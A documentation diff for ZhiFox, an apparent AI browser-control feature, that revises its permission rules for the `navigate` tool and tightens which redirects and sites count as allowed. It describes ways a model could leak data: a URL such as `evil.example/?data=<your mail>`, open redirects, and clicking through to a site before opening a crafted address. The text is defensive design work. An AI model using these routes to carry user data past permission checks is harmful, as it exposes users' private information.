@@ -223,16 +223,18 @@ like a shell command's.
 carry data out (`evil.example/?data=<your mail>`). A site can redirect, though, and many have an open redirect
 (`/redirect?to=…`): once you've allowed a site, the model could open its redirect without asking and let Chrome follow
 it anywhere. So only the site `navigate` was asked to open is remembered as allowed, never the site a redirect lands
-on. And while `navigate` runs, ZhiFox turns on Chrome's Fetch domain for that tab (documents only, before the request
+on, and the site the tab happens to be on doesn't count either: a click on a link doesn't ask, so if being on a site
+were enough, clicking through to it and then opening a made-up `B/?data=…` would carry data out in two steps. (The
+cost: after clicking through to a site, the first `navigate` straight to it asks once.) And while `navigate` runs, ZhiFox turns on Chrome's Fetch domain for that tab (documents only, before the request
 goes out): every hop of the main frame, whether a server's 3xx or the page sending itself elsewhere while it loads
 (a script setting `location`, a `<meta http-equiv="refresh">` due within `BROWSER_REDIRECT_WAIT` seconds), is followed
-only to a site that wouldn't have asked: the one it was opening, a site allowed in this conversation, or the site of
-the page the tab is on. Any other hop is aborted, the tab stays on the page it was on, and the model is told where the
+only to a site that wouldn't have asked: the one it was opening or a site allowed in this conversation. Any other hop
+is aborted, the tab stays on the page it was on, and the model is told where the
 site wanted to go; going there takes another `navigate`, which asks you the first time. Every paused request gets an
 answer, and the Fetch domain is turned off as soon as `navigate` returns; back, forward and reload aren't guarded, and
 clicking a link still doesn't ask (the page put it there). What this can't stop: a page that navigates itself later,
-after `navigate` has returned (a timer in `onload`, a refresh due in a few seconds). That site still isn't remembered
-as allowed, but while the tab is on it, opening that site again doesn't ask, just as after clicking a link there.
+after `navigate` has returned (a timer in `onload`, a refresh due in a few seconds). That hop carries only the address
+the page itself wrote, like a link; the site isn't remembered as allowed, and opening it with `navigate` asks you as usual.
 
 Computer use of the whole desktop (screenshots of and control over your entire screen, not just one browser) is a
 separate, advanced option with much stricter rules; see the next section.
